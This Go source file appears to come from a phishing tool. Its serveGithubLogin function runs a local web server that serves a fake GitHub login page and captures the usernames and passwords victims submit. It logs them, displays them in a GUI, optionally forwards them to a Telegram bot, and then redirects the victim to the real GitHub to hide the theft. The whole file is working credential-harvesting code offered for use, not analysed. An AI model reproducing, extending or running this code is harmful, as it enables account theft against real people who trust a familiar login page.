package main

import (
	"context"
	"fmt"
	"log"
	"net/http"

	"fyne.io/fyne"
	"fyne.io/fyne/dialog"
	"fyne.io/fyne/widget"
	"github.com/raifpy/Go/errHandler"
)

func serveGithubLogin(kapat chan bool, win fyne.Window, textGrid *widget.TextGrid, textStream *string) {
	serveFunc := func(response http.ResponseWriter, req *http.Request) {
		log.Println("Requests -> ", req.Form.Encode())
		//query := req.URL.Query()
		//if key, ok := query["nick"]; ok {
		if !errHandler.HandlerBool(req.ParseForm()) {
			login := req.FormValue("login")
			pass := req.FormValue("password")

			if login != "" || pass != "" {
				log.Printf("Login = %s  Passw = %s", login, pass)

				*textStream += "\nlogin = " + login + "\nPass = " + pass + "\n"
				if useTelegramBot {
					tg.send("Login = " + login + "\nPass = " + pass)
				}
				textGrid.SetText(*textStream)
				notiApp.SendNotification(fyne.NewNotification("New Form", login+" : "+pass))
				http.Redirect(response, req, "https://github.com", 301)
				return
			}
			*textStream += "New Requests\n"
			if useTelegramBot {
				tg.send("New Request on GitHub")
			}
			textGrid.SetText(*textStream)
		} else {
			log.Println("Error to req.ParseFrom")
		}

		fmt.Fprintln(response, githubLogin)
		return
	}

	//http.HandleFunc("/", serveFunc)

	m := http.NewServeMux()
	s := http.Server{Addr: ":8089", Handler: m}
	m.HandleFunc("/", serveFunc)

	go func() {
		<-kapat
		s.Shutdown(context.Background())
		fmt.Println("Server Shutdown")

	}()

	if err := s.ListenAndServe(); errHandler.HandlerBool(err) {
		if useTelegramBot {
			tg.send(err.Error())
		}
		dialog.ShowError(err, win)
	}
}
